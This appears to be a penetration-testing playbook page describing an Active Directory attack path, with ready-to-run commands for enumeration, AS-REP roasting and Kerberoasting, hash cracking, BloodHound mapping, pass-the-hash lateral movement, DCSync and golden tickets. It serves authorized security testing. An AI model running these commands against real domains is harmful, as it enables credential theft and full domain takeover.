---
summary: Active Directory attack path — enum, Kerberoast/AS-REP, BloodHound, lateral movement, DCSync.
status: active
tags: [security, playbook, active-directory, windows]
private: false
---

# Active Directory

Domain compromise is a graph problem: any-user → find a path → Domain Admin. Get one set of creds, then let BloodHound draw the route.

## Enumerate

```bash
# unauth / low-priv, from Linux (netexec = nxc)
nxc smb $DC -u '' -p ''                       # null session
enum4linux-ng -A $DC
nxc smb $DC -u user -p pass --users --groups --shares --pass-pol
ldapsearch -x -H ldap://$DC -b "dc=corp,dc=local"
```

## Kerberos attacks (no shell needed)

```bash
# AS-REP roast: users with "no preauth" -> crackable hash
impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip $DC
# Kerberoast: any valid creds -> service-account TGS hashes
impacket-GetUserSPNs corp.local/user:pass -dc-ip $DC -request
hashcat -m 18200 asrep.txt rockyou.txt      # AS-REP
hashcat -m 13100 tgs.txt   rockyou.txt      # Kerberoast
```

## BloodHound (map the graph)

```bash
bloodhound-python -d corp.local -u user -p pass -c all -ns $DC
# or SharpHound.exe -c All on a domain host; import the .zip into BloodHound
```

Mark owned nodes → run "Shortest Path to Domain Admins" and the pre-built queries (DCSync rights, unconstrained delegation, ACL abuse).

## Lateral movement (with creds/hash — pass-the-hash)

```bash
nxc smb $HOSTS -u user -H <NTLM> --local-auth       # spray hash, find admin
impacket-psexec  corp.local/user@$IP -hashes :<NTLM>
impacket-wmiexec corp.local/user@$IP -hashes :<NTLM>   # quieter than psexec
evil-winrm -i $IP -u user -H <NTLM>                     # if WinRM 5985
```

## Common escalation primitives

- **Kerberoast → crack → service acct**, **DCSync** (`secretsdump.py -just-dc`), **unconstrained/constrained delegation**, **ACL abuse** (GenericWrite/WriteDACL → targeted Kerberoast or reset), **ADCS ESC1-8** (`certipy`), **GPP `cpassword`** in SYSVOL.
- **Golden/silver ticket** for persistence once you own `krbtgt`.

## Related

- [Pentest Playbook — Index](kb://11-security-playbook-pentest-playbook-index)
- [Windows Privilege Escalation](kb://11-security-playbook-windows-privesc)
- [Pivoting & Tunneling](kb://11-security-playbook-pivoting-tunneling)
